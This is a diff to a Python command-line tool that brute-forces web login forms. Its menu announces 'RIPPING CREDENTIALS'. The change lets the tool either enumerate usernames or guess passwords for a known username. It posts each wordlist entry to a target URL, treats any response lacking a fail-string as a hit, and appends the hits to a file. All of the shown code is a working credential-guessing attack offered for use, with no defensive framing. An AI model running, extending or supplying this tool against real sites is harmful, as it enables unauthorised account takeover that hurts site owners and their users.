@@ -330,8 +330,9 @@ while True:
 
             try:
                 URL = raw_input(Fore.CYAN + "Enter Target URL: ").strip()
+                FIELD1 = raw_input(Fore.CYAN + "Enter Username Field (leave empty to skip): ").strip()
                 VALID = raw_input(Fore.MAGENTA + "Enter Valid Username (leave empty to skip): ").strip()
-                FIELD = raw_input(Fore.CYAN + "Enter Field Name: ").strip()
+                FIELD2 = raw_input(Fore.CYAN + "Enter Second Field (Password OR Username field): ").strip()
                 WORDLIST = raw_input(Fore.CYAN + "Enter Username or Password Wordlist (.txt): ").strip()
                 FAIL = raw_input(Fore.CYAN + "Enter Fail-String (invalid indicator): ").strip()
                 OUTPUT = raw_input(Fore.CYAN + "Enter Output File (success.txt): ").strip()
@@ -346,43 +347,56 @@ while True:
                 print(Fore.MAGENTA + "\nRIPPING CREDENTIALS...\n")
                 open(OUTPUT, "a").close()
 
-                for user in words:
-                    print(Fore.YELLOW + "Trying username: {}".format(user))
+                mode = "password" if VALID != "" else "username"
 
-                    if VALID == "":
-                        data = {FIELD: user}
+                if mode == "password":
+                    if FIELD1 == "" or FIELD2 == "":
+                        print(Fore.RED + "ERROR: FIELD1 and FIELD2 are required for password bruteforce.")
+                        raw_input("Press Enter...")
+                        return
+
+                else:
+                    if FIELD2 == "":
+                        print(Fore.RED + "ERROR: FIELD2 (username field) is required for username bruteforce.")
+                        raw_input("Press Enter...")
+                        return
+
+                for user in words:
+                    print(Fore.YELLOW + "Trying: {}".format(user))
+
+                    if mode == "username":
+                        data = { FIELD2: user }
                     else:
-                        data = {
-                            "username": VALID,
-                            FIELD: user
-                        }
+                        data = { FIELD1: VALID, FIELD2: user }
 
                     try:
                         r = requests.post(URL, data=data, timeout=10)
                     except requests.exceptions.Timeout:
-                        print(Fore.RED + "[ERROR] Timeout, skipping:", user)
+                        print(Fore.RED + "[ERROR] Timeout:", user)
                         continue
                     except requests.exceptions.ConnectionError:
                         print(Fore.RED + "[ERROR] Connection lost.")
                         raw_input("Press Enter...")
-                        return
+                        break
                     except Exception as e:
                         print(Fore.RED + "[ERROR] Unexpected:", e)
-                        continue
+                        return
 
                     if FAIL not in r.text:
-                        print(Fore.GREEN + "\n[VALID USERNAME FOUND] -> " + user)
+                        print(Fore.GREEN + "\n[VALID FOUND] -> " + user)
                         try:
-                            with open(OUTPUT, "w") as out:
+                            with open(OUTPUT, "a") as out:
                                 out.write(user + "\n")
                         except:
                             print(Fore.RED + "[ERROR] Cannot write output file.")
+
                         raw_input("\nPress Enter...")
-                        return
+                        break
+
                     else:
                         print(Fore.RED + "[INVALID] " + user)
 
-                print(Fore.RED + "\nBruteforce complete. No valid username found.")
+                print(Fore.RED + "\nBruteforce complete. No valid match found.")
                 raw_input("Press Enter...")
 
             except KeyboardInterrupt:
@@ -460,3 +474,4 @@ while True:
     if x not in ["0", "1", "2", "3", "4"]:
         print("Invalid option.")
         raw_input(" Press Enter to return to menu...")
+     
